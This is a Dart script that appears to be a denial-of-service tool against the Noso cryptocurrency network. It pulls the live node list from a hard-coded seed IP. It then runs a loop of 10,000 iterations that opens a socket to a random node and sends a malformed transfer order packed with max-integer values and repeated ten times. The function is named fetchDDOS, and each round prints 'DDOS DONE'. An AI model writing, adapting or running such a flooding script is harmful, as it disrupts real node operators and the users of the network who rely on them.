import 'dart:async';
import 'dart:io';
import 'dart:math';
import 'dart:convert';
import 'package:http/http.dart' as http;
import 'package:noso_dart/models/noso/seed.dart';
import 'package:noso_dart/node_request.dart';
import 'package:noso_dart/utils/data_parser.dart';
import 'package:nososova/models/responses/response_node.dart';

var mSeed = Seed(ip: "207.180.200.78", port: 8085);

var lolMessage = """
NSLORDER 2147483647 1.61 2147483647 ORDER 2147483647 \$TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 \$TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 \$TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 \$TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 \$TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 \$TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 \$TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 \$TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 \$TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
2147483647 \$TRFR OR2x30gm5rj8rkrvavqkgubgvlosyyvf7x49quu6wlrylght9nrj 1 TRFR 1701894146 Test 1 BFKmqWRV4bSBAjLPTysG9TO5ywbA/82WQF2D3wA3F7kgjIsIxZhpqw/+Jrtsgsj+qf6HlVFVXfrxIsdgsyOAgSU= N4P9zj6rGUSDGy58BcccM8qNFeNPUCi NZXpFV6SHcJ6xhhX2Bgid4ofQqsbEb 1000000 1000000 MEQCIDmSnRUacxeNvhFOh7Jgbpx+cF2Hm5OVRNhMYcHMwLHUAiBQk02eBOJClRz2PNc1CTFI+DJixpQJkraZDunl2iEmeg== tR4NuhCL6YSgMBvyXGwi4errAhgSp9Vfjz6JjpeYV9Mcu9P7,
""";

/* 
   */

main() async {
  List<Seed> nodesList = [];

  try {
    /// Запасни варіант отримання активних вузлів з RPC
/*  
    final url = Uri.parse('https://rpc.nosocoin.com:8078');
    final headers = {
      'Content-Type': 'application/json',
      'Origin': 'https://rpc.nosocoin.com',
    };

    final requestBody = jsonEncode({
      'jsonrpc': '2.0',
      'method': 'getmasternodes',
      'params': [''],
      'id': 1,
    });

    final response = await http.post(
      url,
      headers: headers,
      body: requestBody,
    );

    if (response.statusCode == 200) {
      final responseData = jsonDecode(response.body);

      final result = responseData['result'][0];
      final nodesString = result['nodes'] as String;

      final cleanNodesString = nodesString
          .replaceAll(RegExp(r'\]\['), '|')
          .replaceAll(RegExp(r'[\[\]]'), '');

      final nodes = cleanNodesString.split('|');

      for (var node in nodes) {
        final parts = node.split(',');
        if (parts.length >= 2) {
          final ips = parts[0];
          final ports = int.parse(parts[1]);
          nodesList.add(Seed(ip: ips, port: ports));
        }
      }
    } else {
      print('Failed to load masternodes');
    }
    */

    var response = await fetchNode(NodeRequest.getNodeList, mSeed);
    if (response.errors == null) {
      nodesList = DataParser.parseDataSeeds(response.value);
    } else {
      print("ERROR request RPC");
      return;
    }

    print("Get nodes list ${nodesList.length}");

    print("Wait 1 sec");
    await Future.delayed(Duration(seconds: 1));

    if (nodesList.isEmpty) {
      print("empty list exit");
      return;
    }

    for (int i = 0; i < 10000; i++) {
      try {
        var mSeed = nodesList[Random().nextInt(nodesList.length)];
        await fetchDDOS(lolMessage, mSeed);
        print("DDOS DONE -> $i -> ${mSeed.ip}");
      } catch (e) {
        print(e);
      }
    }
  } catch (e) {
    print('Error: $e');
  }
}

fetchDDOS(String command, Seed seed) async {
  try {
    var socket = await Socket.connect(seed.ip, seed.port,
        timeout: const Duration(seconds: 1));

    socket.write(command);
    socket.close();
  } catch (e) {
    print(e);
  }
}

fetchNode(String command, Seed seed) async {
  final responseBytes = <int>[];
  try {
    var socket = await Socket.connect(seed.ip, seed.port,
        timeout: const Duration(seconds: 5));

    socket.write(command);
    await for (var byteData in socket) {
      responseBytes.addAll([...byteData]);
    }

    socket.close();
    if (responseBytes.isNotEmpty) {
      seed.online = true;
      return ResponseNode(value: responseBytes, seed: seed);
    } else {
      return command == NodeRequest.getPendingsList
          ? ResponseNode(value: [])
          : ResponseNode(errors: "Empty response");
    }
  } on TimeoutException catch (_) {
    print("Connection timed out. Check server availability.");

    return ResponseNode(
        errors: "Connection timed out. Check server availability.");
  } on SocketException catch (e) {
    print("SocketException: ${e.message}");

    return ResponseNode(errors: "SocketException: ${e.message}");
  } catch (e) {
    print("ServerService Exception: $e");

    return ResponseNode(errors: "ServerService Exception: $e");
  }
}
